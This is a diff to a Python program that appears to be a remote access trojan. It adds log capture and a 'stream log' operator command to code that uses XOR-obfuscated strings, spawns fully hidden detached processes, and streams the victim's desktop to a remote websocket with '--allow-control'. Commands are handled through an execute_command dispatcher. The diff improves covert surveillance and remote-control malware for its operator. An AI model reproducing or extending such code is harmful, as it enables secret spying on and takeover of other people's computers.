@@ -496,7 +496,8 @@ NODE_DIR = _x("233b23222928")     # nvnode
 DESK_DIR = _x("233b29283e26")     # nvdesk
 BUNDLE_NAME = _x("2328393b232e1229283e2639223d123a24237b796337243d")
 
-_stream_state = {"popen": None, "phase": "idle", "room": "", "last_error": ""}
+_stream_state = {"popen": None, "phase": "idle", "room": "", "last_error": "",
+                 "logf": None}
 
 
 def _stream_dir(name: str) -> str:
@@ -528,7 +529,8 @@ def _extract_zip(zpath: str, dest: str) -> None:
         z.extractall(dest)
 
 
-def _spawn_hidden(argv, cwd=None):
+def _spawn_hidden(argv, cwd=None, stdout=subprocess.DEVNULL,
+                  stderr=subprocess.DEVNULL):
     """Detached, fully hidden process (no window, no console flash)."""
     si = subprocess.STARTUPINFO()
     si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
@@ -536,8 +538,8 @@ def _spawn_hidden(argv, cwd=None):
     return subprocess.Popen(
         argv,
         cwd=cwd,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
+        stdout=stdout,
+        stderr=stderr,
         stdin=subprocess.DEVNULL,
         creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
         startupinfo=si,
@@ -600,6 +602,8 @@ def deploy_stream(room: str = "default") -> str:
                 return                      # already streaming
 
             _stream_state["phase"] = "starting"
+            logf = open(os.path.join(desk, "nvstream.log"), "w")
+            _stream_state["logf"] = logf
             p = _spawn_hidden(
                 [node, script,
                  "--stream-url", STREAM_WS,
@@ -607,6 +611,8 @@ def deploy_stream(room: str = "default") -> str:
                  "--fps", "12",
                  "--allow-control"],
                 cwd=desk,
+                stdout=logf,
+                stderr=subprocess.STDOUT,
             )
             time.sleep(2)
             if p.poll() is not None:
@@ -652,6 +658,21 @@ def stop_stream() -> str:
     return f"[+] stream stopped ({killed} tracked)"
 
 
+def stream_log(lines: int = 100) -> str:
+    """Tail the streamer log (node stdout+stderr incl. ffmpeg/ICE errors)."""
+    path = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvstream.log")
+    if not os.path.exists(path):
+        return "[!] no stream log yet (stream never started on this boot)"
+    try:
+        with open(path, "r", errors="replace") as f:
+            buf = f.read().splitlines()
+        tail = buf[-lines:]
+        return f"--- nvstream.log ({len(buf)} lines, showing {len(tail)}) ---\n" \
+               + "\n".join(tail)
+    except Exception as e:
+        return f"[!] log read failed: {e}"
+
+
 def stream_status() -> str:
     p = _stream_state.get("popen")
     room = _stream_state.get("room") or "default"
@@ -664,6 +685,9 @@ def stream_status() -> str:
     lines = [line]
     if _stream_state.get("last_error"):
         lines.append(f"last_error: {_stream_state['last_error']}")
+    logp = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvstream.log")
+    lines.append("log: " + (logp if os.path.exists(logp)
+                            else "none yet (use: stream log after start)"))
     node = _node_exe()
     lines.append(f"node: {node if node else 'not installed'}")
     script = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR,
@@ -685,6 +709,9 @@ def execute_command(cmd: str) -> bytes:
             return (stream_status() + "\n").encode() + MARKER
         if len(parts) >= 2 and parts[1].lower() == "stop":
             return (stop_stream() + "\n").encode() + MARKER
+        if len(parts) >= 2 and parts[1].lower() == "log":
+            n = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 100
+            return (stream_log(n) + "\n").encode() + MARKER
         room = parts[1] if len(parts) >= 2 and not parts[1].lower().startswith("-") else "default"
         return (deploy_stream(room) + "\n").encode() + MARKER
     if low in ("stream stop", "stop stream", "stopstream"):
